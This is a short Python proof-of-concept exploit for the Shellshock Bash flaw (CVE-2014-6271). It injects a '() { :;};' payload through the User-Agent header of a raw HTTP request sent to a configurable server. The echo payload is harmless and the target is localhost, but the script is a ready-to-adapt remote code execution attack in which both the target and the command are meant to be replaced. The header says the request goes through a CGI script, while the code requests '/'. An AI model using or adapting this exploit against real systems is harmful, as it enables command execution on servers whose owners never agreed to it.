# Shellshock Exploit (CVE-2014-6271)

## Description: Targets the Bash vulnerability that allows remote code execution by sending specially crafted environment variables.
## Script Outline: A script that injects malicious code into environment variables and sends them to a vulnerable web server through a CGI script.


import socket

# Create the malicious payload as per CVE-2014-6271
malicious_payload = "() { :;}; echo 'This is my custom Bash command'"

def send_exploit(payload):
    # Define a vulnerable server address and port (replace with your own)
    target_server_address = ('127.0.0.1', 80)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        print("Socket successfully created")
        
        # Connect to the remote host
        s.connect(target_server_address)

        # Prepare the HTTP GET request with the malicious User-Agent header
        data = f"GET / HTTP/1.0\r\nHost: localhost\r\nUser-Agent: {payload}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
        
        # Send the malicious request
        s.sendall(data.encode()) 
        
        # Receive and print response from the server
        while True:
            recv_data = s.recv(4096).decode()
            
            if len(recv_data) < 1:
                break
            
            print(recv_data)

    except socket.error as e: 
        print(f"Socket error: {e}")
        
    finally:
        # Close the connection
        s.close() 

send_exploit(malicious_payload)
